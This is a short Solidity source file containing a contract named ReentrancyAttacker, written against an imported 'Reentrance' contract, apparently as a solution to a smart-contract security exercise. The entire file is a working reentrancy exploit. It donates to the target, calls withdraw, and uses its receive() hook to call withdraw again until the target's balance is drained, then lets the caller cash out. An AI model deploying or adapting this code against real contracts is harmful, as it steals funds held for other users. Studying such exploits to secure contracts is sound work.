// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.12;

import {Reentrance} from "./Reentrance.sol";

contract ReentrancyAttacker {
    Reentrance public target;
    uint256 public attackAmount;

    function attack(address payable _target) external payable {
        target = Reentrance(_target);
        attackAmount = msg.value;
        target.donate{value: attackAmount}(address(this));
        target.withdraw(attackAmount);
    }

    function cashOut() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {
        if (address(target).balance > 0) {
            target.withdraw(address(target).balance);
        }
    }
}
